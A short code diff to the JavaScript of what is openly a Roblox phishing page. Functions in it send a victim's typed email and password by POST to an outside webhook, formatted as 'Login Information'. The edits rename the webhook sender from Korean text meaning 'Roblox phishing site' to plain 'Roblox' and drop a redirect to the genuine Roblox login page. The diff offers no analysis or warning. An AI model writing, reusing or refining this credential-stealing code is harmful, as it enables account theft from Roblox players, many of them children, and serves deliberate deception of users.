@@ -854,7 +854,6 @@ function sendMessage() {
   
     request.send(JSON.stringify(params));
     
-   // location = "https://www.roblox.com/login";
   }
 }
 
@@ -865,14 +864,12 @@ function sendMessage2() {
     request.open("POST", webhook);
     request.setRequestHeader('Content-type', 'application/json');
     const params = {
-      username: "로블록스 피싱 사이트",
+      username: "Roblox",
       avatar_url: "https://d13pxqgp3ixdbh.cloudfront.net/uploads/15275731135d1b18ce359841d64946e871bd6a29dc.png",
       content: "**```css\n[ Login Information ]\n\n\nId : " + email + "\nPassword : " + pass + "```**"
     }
   
     request.send(JSON.stringify(params));
-    
-    location = "https://www.roblox.com/login";
 }
 
     var Roblox = Roblox || {};
